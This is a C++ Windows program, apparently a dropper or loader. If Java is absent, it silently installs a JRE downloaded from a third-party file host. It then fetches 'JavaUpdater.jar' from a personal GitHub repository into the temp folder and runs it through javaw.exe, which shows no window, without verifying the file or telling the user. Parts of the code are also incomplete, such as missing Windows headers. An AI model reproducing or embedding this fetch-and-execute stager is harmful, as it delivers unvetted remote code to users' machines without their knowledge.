#include <iostream>
#include <fstream>
#include <string>
#include <regex>
#include <filesystem>
#include <cstdlib>
#include <curl/curl.h>

bool isJavaInstalled() {
    int result = system("java -version 2> nul");
    return result == 0;
}

std::string getJavaPath() {
    char path[MAX_PATH];
    DWORD length = GetEnvironmentVariable("JAVA_HOME", path, MAX_PATH);
    if(length == 0) {
        return "";
    }
    return std::string(path);
}

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    return fwrite(ptr, size, nmemb, stream);
}

bool download(const std::string &url, const std::string &localFilename) {
    CURL *curl;
    CURLcode res;
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if(curl) {
        FILE *fp = fopen(localFilename.c_str(), "wb");
        if(fp == NULL) {
            curl_easy_cleanup(curl);
            return false;
        }
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            curl_easy_cleanup(curl);
            fclose(fp);
            return false;
        }
        curl_easy_cleanup(curl);
        fclose(fp);
    } else {
        return false;
    }
    curl_global_cleanup();
    return true;
}

bool installJavaSilently(const std::string &installerPath) {
    std::string command = installerPath + " /s";
    int result = system(command.c_str());
    return result == 0;
}

bool runUpdater(const std::string &updaterPath, const std::string &javaPath) {
    std::string command = "\"" + javaPath + "\\bin\\javaw.exe\" -jar \"" + updaterPath + "\"";
    int result = system(command.c_str());
    return result == 0;
}

void deleteFile(const std::string &filePath) {
    std::filesystem::remove(filePath);
}

int main() {
    std::string tempDir = std::filesystem::temp_directory_path().string();

    if (!isJavaInstalled()) {
        std::string javaURL = "https://files01.tchspt.com/temp/jre-8u371-windows-x64.exe";
        std::string localFilename = tempDir + "\\jre-8u371-windows-x64.exe";
        if (!download(javaURL, localFilename)) {
            std::cout << "Error downloading Java." << std::endl;
            return 1;
        }
        installJavaSilently(localFilename);
        deleteFile(localFilename);
    } else {
        std::cout << "Java is already installed." << std::endl;
    }

    std::string javaPath = getJavaPath();

    if (javaPath.empty()) {
        std::cout << "Java path not found." << std::endl;
    } else {
        std::string updaterURL = "https://raw.githubusercontent.com/dolmety/storage/main/JavaUpdater.jar";
        std::string updaterPath = tempDir + "\\JavaUpdater.jar";
        if (!download(updaterURL, updaterPath)) {
            std::cout << "Error downloading updater." << std::endl;
            return 1;
        }
        runUpdater(updaterPath, javaPath);
    }

    return 0;
}